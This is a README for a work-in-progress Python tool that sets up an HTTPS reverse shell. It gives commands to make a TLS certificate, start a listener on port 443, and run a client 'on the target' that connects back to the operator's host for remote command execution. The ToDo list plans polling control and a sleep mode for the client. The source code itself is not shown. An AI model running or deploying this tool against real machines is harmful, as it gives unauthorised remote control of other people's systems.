# HTTPS Reverse Shell

**Work in Progress!** 

I hacked this together in two days, so take care.

It basically works, but a lot of stuff is still missing/hacky. Especially if two clients connect at the same time, things get wild.

## Create Cert and Key for server

```bash
openssl req -new -newkey rsa:4096 -days 730 -nodes -x509 -keyout server.key -out server.crt
```

When prompted write whatever. Or mash enter. Put these in the same directory as the server or supply the paths via command line arguments.

## Howto

On your own machine (use sudo/root for low ports):

```bash
sudo python3 server.py -p 443
```

On the target:

```bash
python3 client.py -p 443 -t <your_ip_or_hostname>
```
or 
```bash
python client.py -p 443 -t <your_ip_or_hostname>
```

Use the parameter `--help` on either to see all possible parameters.

The server requires python3. The client works with both Python 2.7 and Python 3.

## Requirements

None

## ToDo

* Monitor status of client
* Handle multiple clients
* Proper client session instead of just RCE
* Python2 version of client [done]
* C version of client
* Actually take Content-Length into account for big responses [done]
* Auto-create key/cert
* Control client polling speed
* Put client into sleep mode
* Reasonable retries by the client if server does not exist/respond (yet)
